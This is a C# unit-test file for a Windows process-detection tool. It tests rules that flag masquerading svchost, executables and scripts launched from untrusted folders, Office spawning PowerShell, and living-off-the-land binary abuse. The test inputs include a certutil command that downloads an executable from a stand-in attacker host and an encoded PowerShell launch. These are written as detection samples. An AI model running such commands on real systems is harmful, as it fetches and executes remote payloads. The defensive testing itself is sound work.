using FNPPAnalyzer.Config;
using FNPPAnalyzer.Engine;
using FNPPAnalyzer.Rules.Process;

namespace FNPPAnalyzer.Tests;

// Rules consume plain ProcessInfo snapshots, so detection logic is testable with
// fabricated process lists — no live processes or WMI involved.
public class ProcessRuleTests
{
    private static readonly string System32 =
        Environment.GetFolderPath(Environment.SpecialFolder.System);

    private static ScanContext Ctx(params ProcessInfo[] procs)
    {
        var paths = new Dictionary<int, string>();
        foreach (var p in procs)
            if (p.ExecutablePath != null) paths[p.Pid] = p.ExecutablePath;
        return new ScanContext { Processes = procs, ProcessPaths = paths };
    }

    // ── PROC-001: System process masquerading ────────────────────────────────

    [Fact]
    public void Masquerading_SvchostOutsideTrustedPaths_IsFlagged()
    {
        var rule = new SystemProcessMasqueradingRule(AppConfig.CreateDefault());

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(100, "svchost", @"C:\Users\bob\Downloads\svchost.exe", null, null)));

        var evt = Assert.Single(events);
        Assert.Equal("PROC-001", evt.RuleId);
    }

    [Fact]
    public void Masquerading_SvchostFromSystem32_IsNotFlagged()
    {
        var rule = new SystemProcessMasqueradingRule(AppConfig.CreateDefault());

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(100, "svchost", Path.Combine(System32, "svchost.exe"), null, null)));

        Assert.Empty(events);
    }

    [Fact]
    public void Masquerading_UnrelatedProcessName_IsIgnored()
    {
        var rule = new SystemProcessMasqueradingRule(AppConfig.CreateDefault());

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(100, "myapp", @"C:\Users\bob\Downloads\myapp.exe", null, null)));

        Assert.Empty(events);
    }

    // ── PROC-002/003: Execution from untrusted paths ─────────────────────────

    private static AppConfig ConfigWithUntrusted(string dir)
    {
        var config = AppConfig.CreateDefault();
        config.UntrustedExecutionPaths = [dir];
        return config;
    }

    [Fact]
    public void SuspiciousExecution_ExeInUntrustedDir_IsFlagged()
    {
        var rule = new SuspiciousExecutionRule(ConfigWithUntrusted(@"C:\Temp"));

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(1, "payload", @"C:\Temp\payload.exe", null, null)));

        var evt = Assert.Single(events);
        Assert.Equal("PROC-002", evt.RuleId);
    }

    [Fact]
    public void SuspiciousExecution_PathPrefixWithoutDirectoryBoundary_IsNotFlagged()
    {
        // "C:\Temp" must not match "C:\Temporary\..."
        var rule = new SuspiciousExecutionRule(ConfigWithUntrusted(@"C:\Temp"));

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(1, "app", @"C:\Temporary\app.exe", null, null)));

        Assert.Empty(events);
    }

    [Fact]
    public void SuspiciousExecution_ScriptEngineWithUntrustedScript_FlagsProc003()
    {
        var rule = new SuspiciousExecutionRule(ConfigWithUntrusted(@"C:\Temp"));

        var events = rule.Evaluate(Ctx(new ProcessInfo(
            1, "powershell", Path.Combine(System32, @"WindowsPowerShell\v1.0\powershell.exe"),
            @"powershell.exe -File C:\Temp\stage2.ps1", null)));

        var evt = Assert.Single(events);
        Assert.Equal("PROC-003", evt.RuleId);
    }

    // ── PROC-004: Parent/child anomaly ────────────────────────────────────────

    [Fact]
    public void ParentChild_OfficeSpawningPowershell_IsFlagged()
    {
        var rule = new ParentChildAnomalyRule();

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(10, "WINWORD", @"C:\Program Files\Microsoft Office\WINWORD.EXE", null, null),
            new ProcessInfo(11, "powershell", null, "powershell -nop", ParentPid: 10)));

        var evt = Assert.Single(events);
        Assert.Equal("PROC-004", evt.RuleId);
    }

    [Fact]
    public void ParentChild_ExplorerSpawningPowershell_IsNotFlagged()
    {
        var rule = new ParentChildAnomalyRule();

        var events = rule.Evaluate(Ctx(
            new ProcessInfo(10, "explorer", null, null, null),
            new ProcessInfo(11, "powershell", null, null, ParentPid: 10)));

        Assert.Empty(events);
    }

    // ── PROC-005: LOLBin abuse ────────────────────────────────────────────────

    [Fact]
    public void LolBin_EncodedPowershell_IsFlagged()
    {
        var rule = new LolBinRule();

        var events = rule.Evaluate(Ctx(new ProcessInfo(
            1, "powershell", null, "powershell.exe -enc SQBFAFgA", null)));

        var evt = Assert.Single(events);
        Assert.Equal("PROC-005", evt.RuleId);
    }

    [Fact]
    public void LolBin_CertutilDownload_IsFlagged()
    {
        var rule = new LolBinRule();

        var events = rule.Evaluate(Ctx(new ProcessInfo(
            1, "certutil", null, "certutil -urlcache -f http://evil.example/p.exe p.exe", null)));

        Assert.Single(events);
    }

    [Fact]
    public void LolBin_BenignPowershell_IsNotFlagged()
    {
        var rule = new LolBinRule();

        var events = rule.Evaluate(Ctx(new ProcessInfo(
            1, "powershell", null, @"powershell.exe -File C:\scripts\build.ps1", null)));

        Assert.Empty(events);
    }

    [Fact]
    public void LolBin_ProcessWithoutCommandLine_IsIgnored()
    {
        var rule = new LolBinRule();

        var events = rule.Evaluate(Ctx(new ProcessInfo(1, "certutil", null, null, null)));

        Assert.Empty(events);
    }
}
